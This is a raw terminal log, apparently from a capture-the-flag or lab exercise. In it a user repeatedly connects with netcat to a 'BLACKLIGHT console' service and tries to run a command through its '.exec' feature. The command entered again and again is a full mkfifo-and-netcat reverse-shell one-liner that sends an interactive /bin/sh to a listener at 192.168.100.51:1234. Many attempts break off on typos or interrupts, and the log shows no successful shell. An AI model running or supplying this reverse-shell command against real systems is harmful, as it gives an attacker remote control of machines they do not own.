+[?2004l[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i 2>&1 | nc 192.168.100.51 1234 >/tmp/f
+You have one more command until the server shuts down. Choose wisely!
+.exec rm /tmp/f;mkfifo /tmp/f;cat/tmp/f
+Bye!
+^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | n c^?^? nc 192.168.100.51 1234 > /tmp/f
+You have one more command until the server shuts down. Choose wisely!
+.exec rm /tmp/f;nkfi^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.100.51 123 ^?^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004l
+.exec rm /tmp/f;mkfifo /tmp/f ; cat /tmp/f|bi^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004l
+^X^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec rm /tmp/f;mkff^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec r,^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004l[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc 192.168.100.51 13^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004l
+^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc 192.168.100.51 1234 >/tmp/f
+^C
+[?2004h[..............~]$ exit
+[?2004lexit
+
+Script done on 2025-11-29 12:19:07+03:00 [COMMAND_EXIT_CODE="130"]
